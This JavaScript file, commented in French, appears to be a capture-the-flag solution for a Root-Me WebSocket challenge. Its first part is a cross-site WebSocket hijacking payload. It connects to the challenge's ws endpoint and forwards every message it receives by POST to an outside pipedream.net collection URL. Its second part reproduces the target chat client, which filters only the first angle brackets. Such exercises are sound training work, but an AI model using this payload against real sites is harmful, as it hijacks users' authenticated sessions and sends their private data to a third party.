//mon url pour recuperer les resultats

let endpoint = "https://eoa21cz1z5v9xqj.m.pipedream.net"

//on check si le navigateur supporte le websocket
if (!window.WebSocket) {
    console.log("socket not supported by this browser");
}

//je initialise mon socket en lui passant le endpoint
var connection = new WebSocket('ws://ctf27.root-me.org/ws');  

//on envoie un message au websocket
connection.send("hello");

//si le websocket envoie une reponse on la renvoie vers pipedream
connection.onmessage = (datas)=>{
    fetch(endpoint,{
        method:"POST",
        body:JSON.stringify(datas)
    })
}

$(function () {
    var input = $('#input');
    window.WebSocket = window.WebSocket || window.MozWebSocket;
    if (!window.WebSocket) {
        alert('Sorry, but your browser doesn\'t support WebSocket.')
        window.location.href="/"
        return;
    }
    var connection = new WebSocket('ws://'+window.location.hostname+'/ws');  
    connection.onopen = function () {};  
    connection.onerror = function (error) {
      alert("An error occured, you will reload the page for you to access a new room !")
      location.reload()
    };
    connection.onmessage = function (message) {
      $("#chatbox").append("You: "+$("#input").val().replace('<','').replace('>','')+"\n")
      $("#chatbox").append("\nBot: "+message["data"].replace('<','').replace('>','')+"\n-------------------------------------------------------------\n")
      $('#chatbox').scrollTop($('#chatbox')[0].scrollHeight);
      $("#input").val("")
    };
    connection.onclose = function(message) {
      $('#chatbox').append("--------------------------END OF COMMUNICATION--------------------------")
    }
    input.keydown(function(e) {
      if (e.keyCode === 13) {
        var msg = $("#input").val();
        if (!msg) {
          return;
        }
        connection.send(msg);
      }
    });  
});
